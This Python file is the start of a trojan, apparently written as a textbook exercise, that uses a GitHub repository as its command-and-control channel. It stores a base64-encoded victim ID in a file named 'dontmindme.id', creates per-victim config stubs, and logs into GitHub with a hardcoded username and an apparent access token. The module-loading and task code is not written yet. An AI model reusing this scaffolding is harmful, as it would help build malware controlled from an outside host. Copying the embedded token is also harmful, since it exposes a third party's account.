import json
from base64 import b64encode, b64decode
import sys
import time
import imp
import random
import threading
import queue
import os
from uuid import uuid1
from pathlib import Path
from github3 import login

# Trojan config file will be json/base64 encoded.


def convert_config(data):
    if isinstance(data, dict):
        # indicates that it's being writting out to config and will need to be
        # converted to json and encoded to bytes.
        bytes_json = json.dumps(data).encode('utf-8')
        return b64encode(bytes_json)
    if isinstance(data, bytes):
        basedecode = b64decode(data).decode('utf-8')
        json_dict = json.loads(basedecode)
        return json_dict
    else:
        print('[*] Data not recognized')


def get_trojan_id():
    '''Look in local directory for trojan ID as dontmindme.id, if missing run create id.'''
    loaded = False
    while not loaded:
        try:
            with open('./dontmindme.id', 'rb') as f:
                data = f.read()
                decoded = convert_config(data)
                loaded = True
                print('successfully loaded trojan_id as {}'.format(decoded['uid']))
                return decoded['uid']
        except FileNotFoundError as e:
            # file wasn't found so a new one will need to be made.
            create_trojan_id()


def create_trojan_id():
    '''Create an id, check config for ids and generate a new id if collision occurs.'''
    config = {}
    config['uid'] = str(uuid1())
    encoded_config = convert_config(config)
    with open('./dontmindme.id', 'wb+') as f:
        f.write(encoded_config)
    # create a stub for config file.
    Path(os.path.abspath('./config/{}.json'.format(config['uid']))).touch()

    print('No ID File was found.  Created one with id: {}'.format(config['uid']))


def connect_to_github():
    gh = login(username='yokai117', token='bb9af41d1c17529b51cc7f52481aac6d953d5937')
    repo = gh.repository('yokai117', 'capter7')
    branch = repo.branch('master')
    return gh, repo, branch


if __name__ == '__main__':
    trojan_id = get_trojan_id()
    data_path = 'data/{}/'.format(trojan_id)
    trojan_modules = []
    configured = False
    task_queue = queue.Queue()

    print(connect_to_github())
